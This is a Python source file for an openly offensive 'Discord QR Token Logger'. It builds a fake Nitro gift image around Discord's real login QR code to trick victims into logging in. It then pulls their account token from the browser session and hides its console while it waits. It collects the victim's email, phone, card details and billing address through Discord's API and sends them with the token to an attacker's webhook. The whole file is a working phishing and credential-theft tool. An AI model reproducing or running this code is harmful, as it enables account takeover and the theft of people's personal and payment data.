"""
Discord QR Token Logger
-----------------------
Generates a Discord Nitro bait image with a QR code that will prompt a user to login.
If the user logs in, their authentication token will be displayed to the console.
Optionally, the user's authentication token may also be sent to a Discord channel via a webhook.

LICENSE: GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007

CREDITS
Lemon.-_-.#3714
Luci (9P9)
the-cult-of-integral
mte0
"""

import base64
import ctypes
import os
import re
import time
from io import BytesIO
from tempfile import NamedTemporaryFile, TemporaryDirectory
from threading import Thread

from bs4 import BeautifulSoup
from discord_webhook import DiscordEmbed, DiscordWebhook
from PIL import Image
from pystray import Icon, Menu, MenuItem
from pystyle import Box, Center, Colorate, Colors, System, Write
from requests import get
from selenium import webdriver
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

from utilities import banner, pystray_img

YES = 'y'
NO = 'n'
SLEEP_TIME = 3


def generate_qr_code(path_1: str, path_2: str) -> None:
    """Generates a QR code using the files in the resources directory.
    \nThis QR code will be placed upon a Discord Nitro template to form a full bait image.
    """
    qr_img = Image.open(path_1, 'r')
    ovly_img = Image.open(os.path.join(os.getcwd(), 'resources', 'overlay.png'), 'r')
    qr_img.paste(ovly_img, (60, 55))
    qr_img.save(path_2, quality=95)


def generate_nitro_template(path_2: str) -> None:
    """Generates a Discord Nitro template using the files in the resources directory.
    \nThis template will be used to form a full bait image after a QR code pasted on it.
    """
    nitro_template = Image.open(os.path.join(os.getcwd(), 'resources', 'template.png'), 'r')
    nitro_template.paste(Image.open(path_2, 'r'), (120, 409))
    nitro_template.save('discord_gift.png', quality=95)


def get_user_std_data(token: str) -> list | None:
    """Gets a user's standard data from the Discord API via their authentication token.
    """
    try:
        headers = {'Authorization': token}
        response = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
        return [response['username'], response['discriminator'], response['email'], response['phone']]
    except:
        return None


def get_user_billing_data(token: str, link_int: int) -> dict:
    """Gets a user's billing data from the Discord API via their authentication token.
    """
    headers = {'Authorization': token}
    if link_int == 1:
        response_json = get('https://discordapp.com/api/v6/users/@me/billing/payment-sources',  headers=headers).json()
    elif link_int == 2:
        response_json = get('https://discordapp.com/api/v9/users/@me/billing/subscriptions',  headers=headers).json()
    return response_json


def main(webhook_url: str) -> None:
    """The main function of the program.
    \nProgram by Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0
    """
    Write.Print('\n\n[!] Generating QR code...', Colors.red_to_purple)
    opts = webdriver.ChromeOptions()
    opts.add_argument('--headless')
    opts.add_experimental_option('detach', True)
    opts.add_experimental_option('excludeSwitches', ['enable-logging'])
    opts.add_argument('--log-level 3')
    
    # This module conflicts with PyStyle; importing here prevents this issue.
    from webdriver_manager.chrome import ChromeDriverManager
    
    os.environ['WDM_LOG_LEVEL'] = '0'
    
    try:
        main.driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()), 
            options=opts)
    except WebDriverException:
        raise SystemExit
    
    main.driver.implicitly_wait(5)
    main.driver.get('https://discord.com/login')
    
    WebDriverWait(main.driver, 10).until(
        EC.presence_of_element_located((
            By.XPATH, "//input[@type='submit']")))
    
    source = BeautifulSoup(main.driver.page_source, features='lxml')
    
    if not (div := re.search(r'qrCode-......', str(source))):
        print(Write.Print(
            '\n[!] The Discord login QR code was not found - please retry or contact us !',
            Colors.red_to_yellow))
        raise SystemExit
    
    div = div.group(0)
    div = source.find('div', {"class": f"{div}"})
    qr_code = div.find('img')['src']
    source = BeautifulSoup(main.driver.page_source, features='lxml')
    div = source.find('div', {"class": "qrCode"})
    
    discord_login = main.driver.current_url
    
    with TemporaryDirectory(dir='.') as td:
        with NamedTemporaryFile(dir=td, suffix='.png') as tp1:
            tp1.write(base64.b64decode(qr_code.replace('data:image/png;base64,', '')))
            Write.Print('\n[!] Generating template for QR code...', Colors.red_to_purple)
            with NamedTemporaryFile(dir=td, suffix='.png') as tp2:
                generate_qr_code(tp1, tp2)
                Write.Print('\n[!] Generating Discord Nitro template for QR code...', Colors.red_to_purple)
                generate_nitro_template(tp2)
                
    Write.Print('\n[#] Waiting for target to login using the QR code...', Colors.red_to_purple)
    pystray_icon.icon.notify("This script has been set to hide until the target's token is grabbed.", 'Waiting for target')
    time.sleep(SLEEP_TIME)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    while True:
        if discord_login != main.driver.current_url:
            try:
                os.remove('discord_gift.png')
            except:
                pass
            token = main.driver.execute_script('''
                window.dispatchEvent(new Event('beforeunload'));
                let iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                let localStorage = iframe.contentWindow.localStorage;
                var token = JSON.parse(localStorage.token);
                return token;
                ''')
            break

    main.driver.quit()
    pystray_icon.icon.notify("The target scanned the QR-code sucessfuly.", 'New Victim !')
    time.sleep(SLEEP_TIME)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
    Write.Print(f"\n\n[?] The following token has been grabbed: {token}", Colors.rainbow)
    
    if webhook_url is not None:
        Write.Print("\n\n[!] Fetching token data for Discord Webhook...", Colors.red_to_purple)
        webhook = DiscordWebhook(url=webhook_url, username='QR-Dtg', avatar_url="https://i.postimg.cc/qRHbRP2g/discord-avatar.png")
        embed = DiscordEmbed(color='88c800')
        if re.search(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) is not None:
            userdata, user_billings, user_subs = get_user_std_data(token), get_user_billing_data(token, 1), get_user_billing_data(token, 2)
            if userdata is not None:
                embed.add_embed_field(name='User Token Info', value=f":crown:`Username:` **{userdata[0]}#{userdata[1]}**\n:e_mail:`Mail:` **{userdata[2]}**\n:mobile_phone:`Phone:` **{userdata[3]}**\n:money_with_wings:`Nitro:` **{':white_check_mark:' if bool(user_subs) else ':x:'}**", inline=False)
                if bool(user_billings):
                    for data in user_billings:
                        if data['type'] == 1:
                            embed.add_embed_field(name='Payment Info (Debit or Credit Card)', value=f""":credit_card:`Brand:` ||**{data['brand']}**||\n:information_source:`Last 4:` ||**{data['last_4']}**||\n:date:`Expiration:` ||**{data['expires_month']}/{data['expires_year']}**||
                            ***Billing Adress:***\n:name_badge:`Name:` ||**{data['billing_address']['name']}**||\n:paperclip:`Line 1:` ||**{data['billing_address']['line_1']}**||\n:paperclips:`Line 2:` ||**{data['billing_address']['line_2']}**||\n:flag_white:`Country:` ||**{data['billing_address']['country']}**||\n:triangular_flag_on_post:`State:` ||**{data['billing_address']['state']}**||\n:cityscape:`City:` ||**{data['billing_address']['city']}**||\n:postbox:`Postal Code:` ||**{data['billing_address']['postal_code']}**||\n""", inline=False)
                        elif data['type'] == 2:
                            embed.add_embed_field(name='Payment Info (Paypal)', value=f""":incoming_envelope:`Paypal Mail:` ||**{data['email']}**||
                            ***Billing Adress:***\n:name_badge:`Name:` ||**{data['billing_address']['name']}**||\n:paperclip:`Line 1:` ||**{data['billing_address']['line_1']}**||\n:paperclips:`Line 2:` ||**{data['billing_address']['line_2']}**||\n:flag_white:`Country:` ||**{data['billing_address']['country']}**||\n:triangular_flag_on_post:`State:` ||**{data['billing_address']['state']}**||\n:cityscape:`City:` ||**{data['billing_address']['city']}**||\n:postbox:`Postal Code:` ||**{data['billing_address']['postal_code']}**||\n""", inline=False)
                else:
                    embed.add_embed_field(name='Payment Info (:x:)', value="**No Payment Info Founded.**\n", inline=False)
            else:
                embed.add_embed_field(name='User Token Info :interrobang:', value="**This token doesn't provide any information about the account, maybe it's corrupted.**\n", inline=False)
            embed.add_embed_field(name='Token', value=f"```yaml\n{token}\n```", inline=False)        
        else:
            embed.add_embed_field(name='Token', value=f"```yaml\n{token}\n```", inline=False)
        webhook.add_embed(embed)
        embed.set_footer(text='By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0', inline=False)
        Write.Print("\n[!] Sending token data to the Discord Webhook...", Colors.red_to_purple)
        webhook.execute()
        
    Write.Input('\n\n[*] Press ENTER to quit.', Colors.blue_to_green)


if __name__ == "__main__":
    
    def pystray_icon():
        def window_state(_, item):
            if str(item) == 'Show':
                return ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
            elif str(item) == 'Hide':
                return ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            elif str(item) == 'Quit':
                pystray_icon.icon.stop()
                try:
                    main.driver.quit()
                except:
                    pass
                raise SystemExit

        pystray_icon.icon = Icon('QR_DTG', Image.open(BytesIO(base64.b64decode(pystray_img))), menu=Menu(
            MenuItem('Show', window_state),
            MenuItem('Hide', window_state),
            MenuItem('Quit', window_state)
        ))
        pystray_icon.icon.run()
    
    System.Title('QR DISCORD LOGIN - By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0')
    System.Size(140, 35)
    
    print(Colorate.Horizontal(Colors.cyan_to_green, Center.XCenter(banner), 1))
    print(Colorate.Horizontal(Colors.rainbow, Center.GroupAlign(Box.DoubleCube("By Lemon.-_-.#3714, Luci (9P9), the-cult-of-integral and mte0")), 1))
    print(Colorate.Horizontal(Colors.rainbow, Box.Lines("https://github.com/9P9/Discord-QR-Token-Logger").replace('ቐ', "$"), 1), "\n")
    
    confir = Write.Input("[*] Do you want to use a Discord Webhook URL ? [y/n] -> ", Colors.green_to_cyan, interval=0.01)
    if confir == YES or YES.upper():
        th_main = Thread(target=main, args=(Write.Input("\n[*] Enter your webhook url -> ", Colors.green_to_cyan, interval=0.01),))
    elif confir == NO or NO.upper():
        th_main = Thread(target=main, args=(None,))
    else:
        raise SystemExit
    
    Thread(target=pystray_icon).start()
    th_main.start()
    
    while True:
        if not th_main.is_alive():
            pystray_icon.icon.stop()
            break
        time.sleep(SLEEP_TIME)
